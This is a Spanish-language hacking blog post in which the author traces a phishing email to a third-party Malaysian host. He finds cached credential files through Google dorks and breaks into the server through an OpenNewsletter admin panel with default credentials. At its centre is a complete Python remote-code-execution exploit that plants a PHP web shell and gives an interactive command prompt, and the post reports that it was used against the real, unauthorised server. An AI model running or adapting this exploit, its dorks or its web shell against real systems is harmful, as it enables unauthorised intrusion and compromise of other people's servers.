
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Del spam a la intrusion - q3rv0</title>
  <meta name="author" content="q3rv0">

  
  <meta name="description" content="Prologo Hacia rato que no le echaba una ojeada al spam de mi gmail y esta vez tenia el basurin lleno, es que muchas veces uno puede encontrarse &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://q3rv0.github.io/blog/2014/12/14/del-spam-a-la-intrusion/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="/javascripts/ender.js"></script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <link href="/atom.xml" rel="alternate" title="q3rv0" type="application/atom+xml">
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=Arvo:400,400italic,700,700italic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=Playball" rel="stylesheet" type="text/css">

  

</head>

<body>
  <header role="banner"><hgroup>
  <h1><a href="/">q3rv0</a></h1>
  
    <h2>Follow the white rabbit&#8230;.</h2>
  
</hgroup>

</header>
  <div id="navigation">
    <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:q3rv0.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  </div>
  <div id="body"  >
    <div id="main">
      <div id="content">
        <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Del Spam a La Intrusion</h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-12-14T15:03:48-03:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


<div class="entry-content"><p>Prologo</p>

<p>Hacia rato que no le echaba una ojeada al spam de mi gmail y esta vez tenia el basurin lleno, es que muchas veces uno puede encontrarse envuelto en alguna aventurita que te alegre el dia o no, en este caso mas que nada fue un poco de diversion. En fin, mientras leia los subject de los correos me pare en uno que decia: &ldquo;Your account has ben blocked&rdquo;.<!--more--></p>

<p><img src="http://i.imgur.com/pZT4QvO.png"></p>

<p>Era un mail &ldquo;supuestamente&rdquo; eviado desde blockchain, pero como no tenia idea que servicio estaba prestando al publico me fui directamente a la url del sitio.</p>

<p><a href="https://blockchain.info/">https://blockchain.info/</a></p>

<p><img src="http://i.imgur.com/2F6W0PB.png"></p>

<p>La verdad es que nunca me habia logueado en la aplicacion (segun recuerdo), es mas no tengo una cuenta referenciada a este tipo de servicios en general. Al instante y era obvio deduje que se trataba de un caso de phishing, asi que sin dudarlo segui el enlace acortado por goo.gl para afirmar lo antes predicho.</p>

<p><img src="http://i.imgur.com/9b6q9pg.png"></p>

<p>Por desgracia el path del fake no se encontraba, asi que por curiosidad quize seguir por mi parte para cersiorarme de si habia sido movido a otra ruta o es mas, para ver si lograba captar otros tipos de fraudes montados en el mismo hosting, pero&hellip;como hiba a saber eso? &hellip;</p>

<p>Un poco de Google Hacking</p>

<p>Lo primero que hice fue arrancar a jugar con goo*, buscando diversas extenciones de ficheros, hasta que di con algo interesante.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>site:klsicci.com.my ext:txt</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/3KBiyMd.png"></p>

<p>Archivos de configuracion en texto plano!, lamentablemente al pedirlos no se encontraban mas en la ruta, pero si google los tenia, habria que negociar con el.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cache:http://klsicci.com.my/admintest1/config/klsiccic4.txt</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/CN3KSrM.png"></p>

<p>Anque las credenciales podian ser viejas o con suerte, quizas, seguian en uso, no perdia nada con probar.</p>

<p>Trate de establer una conexion por mysql pero me nego el acceso, lo mas probable es que solo admitia conexiones desde localhost o bien mediante una lista de ips habilitadas.</p>

<p>Ya que conocia el user a travez del path /home/klsiccic/ informacion que habia obtenido de los ficheros cacheados, intente loguearme por ftp mediante el password de la db (Me he encontrado con muchos hostings que usan pass global para diferentes servicios), pero esta vez el ftp me reboto.</p>

<p>Todavia faltaba mucho por analizar, asi que segui probando con goog*.</p>

<p>Queria un acceso rapido, entonces pense que podria estar cacheada la webshell del atacante, si es que realmente habia usado una para obtener acceso.</p>

<p>Luego de persistir con un par de strings</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>site:klsicci.com.my && inurl:shell</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/TSNZpb8.png"></p>

<p>Di con el objetivo, pero nuevamente el 404.</p>

<p>Por un lado me incitaba a seguir buscando ya que tenia el title de la webshell que podria ser la herramienta del spammer. Hasta ahora no queria cersiorarme por completo hasta estar seguro de que fuera el autor del echo, tal vez la webshell podria pertenecer a otro intruder que nada tenia que ver con el scam.</p>

<p>Largue otra busqueda.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>site:klsicci.com.my && intitle:"=[ 1n73ct10n privat shell ]="</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/hq8hxbf.png"></p>

<p>Y esta vez tenia un lindo historial, pero todos apuntaban a la misma url fallida.</p>

<p>Aprovechando la lista obtenida, encuentro entre los path que se le pasaban como parametro a la ex shell, un dir de nombre /opennews.</p>

<p><img src="http://i.imgur.com/6fRzOJr.png"></p>

<p><img src="http://i.imgur.com/7za4QMt.png"></p>

<p>Opennewsletter es una aplicacion open-source para administrar listas de mails.</p>

<p>OpenBUGletter</p>

<p>Ravisando en exploit-db encuentro un reporte de multiples vulnerabilidades para las versiones &lt;=2.*. Una de ellas y por cierto la mas critica hablaba de un RCE en la plataforma.</p>

<p><a href="http://www.exploit-db.com/exploits/2981/">http://www.exploit-db.com/exploits/2981/</a></p>

<p>Para ser aprovechado requieria de acceso a la administracion, investigando un poco en el source de opennews el cual lo obtuve de la siguiente web.</p>

<p><a href="http://www.sourcexref.com/xref/opennewsletter/nav.html">http://www.sourcexref.com/xref/opennewsletter/nav.html</a></p>

<p>Veo que las credenciales del admin son tomadas desde config.php y el user, pass por defecto es admin:admin.</p>

<p><img src="http://i.imgur.com/0hWTNj4.png"></p>

<p>Por suerte el fichero no habia sido retocado y pude obtener acceso.</p>

<p><img src="http://i.imgur.com/6PRAemn.png"></p>

<p>Por razones que desconocia el exploit no lograba darme una shell en el sistema, asi que me puse a leer el codigo para ver donde se daba el bug, mirando en subscribers.php se puede ver como se abre el fichero data.dat y se ingresa el contenido de la variable $_POST[&lsquo;email] sin sanitizar.</p>

<p><img src="http://i.imgur.com/lbJNGtc.png"></p>

<p>En settings.php se permite renombrar el mismo a travez de la variable $_POST[&lsquo;db_file&rsquo;] que al igual que la anterior no posee ningun tipo de filtro seguro.</p>

<p><img src="http://i.imgur.com/CXxwXJ8.png"></p>

<p>Ahora que ya tenia una idea de como inyectar codigo, lo unico que quedaba era incrustar un payload en data.dat y este a su vez renombrarlo a *.php, mirando nuevamente el exploit me doy cuenta que para ingresar el codigo hace una peticion a subscribe.php (fichero que no existe en esta version de opennews (2.5.1)), ademas del pasaje de parametros por GET.</p>

<p><img src="http://i.imgur.com/b36Mm54.png"></p>

<p>Asi que decidi codear el mio propio para realizar la explotacion.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'><span class="c"># Description: Opennewsletter remote code execution exploit</span>
</span><span class='line'><span class="c"># Version tested: 2.5.1</span>
</span><span class='line'><span class="c"># Author: q3rv0</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">urllib2</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">urllib</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">re</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">opennews_exploit</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">host</span><span class="p">):</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">host</span><span class="o">=</span><span class="n">host</span>
</span><span class='line'>        <span class="n">cookies</span><span class="o">=</span><span class="n">urllib2</span><span class="o">.</span><span class="n">HTTPCookieProcessor</span><span class="p">()</span>
</span><span class='line'>        <span class="n">opener</span><span class="o">=</span><span class="n">urllib2</span><span class="o">.</span><span class="n">build_opener</span><span class="p">(</span><span class="n">cookies</span><span class="p">)</span>
</span><span class='line'>        <span class="n">urllib2</span><span class="o">.</span><span class="n">install_opener</span><span class="p">(</span><span class="n">opener</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">postSend</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">parametros</span><span class="p">,</span> <span class="n">path</span><span class="p">):</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">&quot;User-Agent&quot;</span><span class="p">:</span><span class="s">&quot;Mozilla/5.0 (X11; Linux i686; rv:24.0) Gecko/20140319 Firefox/24.0 Iceweasel/24.4.0&quot;</span><span class="p">}</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">parametros</span><span class="o">=</span><span class="n">urllib</span><span class="o">.</span><span class="n">urlencode</span><span class="p">(</span><span class="n">parametros</span><span class="p">)</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">path</span><span class="o">=</span><span class="n">path</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">post</span><span class="o">=</span><span class="n">urllib2</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">host</span><span class="o">+</span><span class="bp">self</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">parametros</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="p">)</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">post</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">getOldDbFile</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">get</span><span class="o">=</span><span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">host</span><span class="o">+</span><span class="s">&quot;settings.php&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">name</span><span class="o">=</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">&quot;name=old_db_file value=([\w\.\-_]+)&gt;&quot;</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get</span><span class="p">)</span>
</span><span class='line'>        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">verifyShell</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">path</span><span class="p">):</span>
</span><span class='line'>        <span class="k">try</span><span class="p">:</span>
</span><span class='line'>            <span class="bp">self</span><span class="o">.</span><span class="n">path</span><span class="o">=</span><span class="n">path</span>
</span><span class='line'>            <span class="bp">self</span><span class="o">.</span><span class="n">code</span><span class="o">=</span><span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">host</span><span class="o">+</span><span class="bp">self</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
</span><span class='line'>            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">code</span><span class="o">.</span><span class="n">getcode</span><span class="p">()</span>
</span><span class='line'>        <span class="k">except</span><span class="p">:</span>
</span><span class='line'>            <span class="k">pass</span>
</span><span class='line'>
</span><span class='line'><span class="n">target</span><span class="o">=</span><span class="s">&quot;http://pwnedhost.com/opennews/&quot;</span>
</span><span class='line'><span class="n">shell</span><span class="o">=</span><span class="s">&quot;shell.php&quot;</span>
</span><span class='line'><span class="n">user</span><span class="o">=</span><span class="s">&quot;admin&quot;</span>
</span><span class='line'><span class="n">passwd</span><span class="o">=</span><span class="s">&quot;admin&quot;</span>
</span><span class='line'><span class="n">admin_name</span><span class="o">=</span><span class="s">&quot;Your Name&quot;</span>
</span><span class='line'><span class="n">admin_email</span><span class="o">=</span><span class="s">&quot;you@domain.com&quot;</span>
</span><span class='line'><span class="n">charset</span><span class="o">=</span><span class="s">&quot;UTF-8&quot;</span>
</span><span class='line'><span class="n">site_url</span><span class="o">=</span><span class="s">&quot;http://www.yourwebsite.com&quot;</span>
</span><span class='line'><span class="n">opennews_directory</span><span class="o">=</span><span class="s">&quot;/&quot;</span>
</span><span class='line'><span class="n">payload</span><span class="o">=</span><span class="s">&quot;&lt;?php echo `$_POST[exec]`; ?&gt;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">rce</span><span class="o">=</span><span class="n">opennews_exploit</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">get_shell</span><span class="p">(</span><span class="n">shell</span><span class="p">):</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[*] Obteniendo la shell :)</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
</span><span class='line'>        <span class="n">command</span><span class="o">=</span><span class="nb">raw_input</span><span class="p">(</span><span class="s">&quot;$~: &quot;</span><span class="p">)</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">+</span><span class="n">rce</span><span class="o">.</span><span class="n">postSend</span><span class="p">({</span><span class="s">&quot;exec&quot;</span><span class="p">:</span><span class="n">command</span><span class="p">},</span> <span class="n">shell</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">rce</span><span class="o">.</span><span class="n">verifyShell</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span><span class="o">==</span><span class="mi">200</span><span class="p">:</span>
</span><span class='line'>    <span class="n">get_shell</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">else</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">[*] Logueando...</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>    <span class="n">rce</span><span class="o">.</span><span class="n">postSend</span><span class="p">({</span><span class="s">&quot;username&quot;</span><span class="p">:</span><span class="n">user</span><span class="p">,</span> <span class="s">&quot;password&quot;</span><span class="p">:</span><span class="n">passwd</span><span class="p">},</span> <span class="s">&quot;index.php?action=login&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[*] Insertando el payload...</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>    <span class="n">rce</span><span class="o">.</span><span class="n">postSend</span><span class="p">({</span><span class="s">&quot;email&quot;</span><span class="p">:</span><span class="n">payload</span><span class="p">},</span> <span class="s">&quot;subscribers.php?action=add&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[*] Renombrando la shell...</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>    <span class="n">rce</span><span class="o">.</span><span class="n">postSend</span><span class="p">({</span><span class="s">&quot;admin_username&quot;</span><span class="p">:</span><span class="n">user</span><span class="p">,</span> <span class="s">&quot;admin_password&quot;</span><span class="p">:</span><span class="n">passwd</span><span class="p">,</span> <span class="s">&quot;admin_name&quot;</span><span class="p">:</span><span class="n">admin_name</span><span class="p">,</span> <span class="s">&quot;admin_email&quot;</span><span class="p">:</span><span class="n">admin_email</span><span class="p">,</span> <span class="s">&quot;charset&quot;</span><span class="p">:</span><span class="n">charset</span><span class="p">,</span> <span class="s">&quot;site_url&quot;</span><span class="p">:</span><span class="n">site_url</span><span class="p">,</span> <span class="s">&quot;opennewsletter_dir&quot;</span><span class="p">:</span><span class="n">opennews_directory</span><span class="p">,</span> <span class="s">&quot;old_db_file&quot;</span><span class="p">:</span><span class="n">rce</span><span class="o">.</span><span class="n">getOldDbFile</span><span class="p">(),</span> <span class="s">&quot;db_file&quot;</span><span class="p">:</span><span class="n">shell</span><span class="p">,</span> <span class="s">&quot;action&quot;</span><span class="p">:</span><span class="s">&quot;update&quot;</span><span class="p">},</span> <span class="s">&quot;settings.php&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">get_shell</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>




<blockquote><p>Cabe decir que el codigo del exploit es a modo de POC, solo fue testeado en la version 2.5.1, podria no funcionar en versiones anteriores.</p></blockquote>


<p>run exploit</p>

<p><img src="http://i.imgur.com/45SiCdg.png?1"></p>

<p>Listo! ya estaba dentro.</p>

<p><img src="http://i.imgur.com/2tssG3F.png"></p>

<p>Buscando rastros del scam.</p>

<p>Luego de darle vueltas durante un rato, entrar y salir de directorios, darle a find como loco, no pude dar con el phishing, muchas veces las aventuras nunca terminan como uno quiere, eso terminaba por confirmarme de que el admin se habia encargado de el. Pero por otra parte encontre ciertos ficheros que comprometian aun mas al spammer/intruder.</p>

<p>El pequeño arsenal del defacer.</p>

<p><img src="http://i.imgur.com/7Ri8TTI.png"></p>

<p>Ojala les haya gustado esta hackanecdota, saludos!</p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">q3rv0</span></span>

      








  


<time datetime="2014-12-14T15:03:48-03:00" pubdate data-updated="true"></time>
      


    </p>
    
      <div class="sharing">
  
  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://q3rv0.github.io/blog/2014/12/14/del-spam-a-la-intrusion/" data-via="q3rv0" data-counturl="http://q3rv0.github.io/blog/2014/12/14/del-spam-a-la-intrusion/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2014/11/24/desbordando-el-buffer-en-linux-x86-iii-aslr-bypass/" title="Previous Post: Desbordando el buffer en linux x86 (III) [ASLR bypass]">&laquo; Desbordando el buffer en linux x86 (III) [ASLR bypass]</a>
      
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2014/12/14/del-spam-a-la-intrusion/">Del spam a la intrusion</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/11/24/desbordando-el-buffer-en-linux-x86-iii-aslr-bypass/">Desbordando el buffer en linux x86 (III) [ASLR bypass]</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/11/24/desbordando-el-buffer-en-linux-x86-ii-nop-sled/">Desbordando el buffer en linux x86 (II) [NOP Sled]</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/11/22/desbordando-el-buffer-en-linux-x86-i/">Desbordando el buffer en linux x86 (I)</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/11/22/tomando-el-control-de-una-camara-axis-parte-i/">Tomando el control de una camara AXIS – Parte I</a>
      </li>
    
  </ul>
</section>





  
</aside>


      </div>
    </div>
    <footer role="contentinfo"><p>
  Copyright &copy; 2015 - q3rv0 -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a>. Design by <a href="http://octopressthemes.com">Octopress Themes</a></span>
</p>

</footer>
    







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





  </div>
</body>
</html>
